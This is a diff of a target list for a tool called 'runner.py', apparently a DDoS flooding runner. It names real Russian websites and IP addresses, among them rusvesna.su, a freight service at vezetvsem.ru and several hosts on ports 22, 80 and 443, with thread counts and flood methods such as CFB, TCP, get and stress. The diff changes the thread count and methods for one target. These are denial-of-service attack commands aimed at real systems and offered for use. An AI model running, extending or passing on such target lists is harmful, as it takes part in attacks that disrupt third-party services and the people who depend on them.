@@ -15,4 +15,4 @@ runner.py http://rusvesna.su/ http://m.rusvesna.su/ -t 800 --http-methods CFB CF
 #runner.py tcp://87.226.162.181:80 tcp://87.226.162.181:443 tcp://87.226.162.53:80 tcp://87.226.162.53:443 tcp://95.167.23.6:80 tcp://95.167.23.6:443 -t 1000 --http-methods TCP
 
 ###Везёт всем - онлайн-сервис по грузоперевозкам.
-runner.py https://www.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 2000 --http-methods stress
+runner.py https://www.vezetvsem.ru/ 89.108.106.50:80 89.108.106.50:443 https://89.108.106.50:443 tcp://89.108.106.50:22 tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 1500 --http-methods get stress
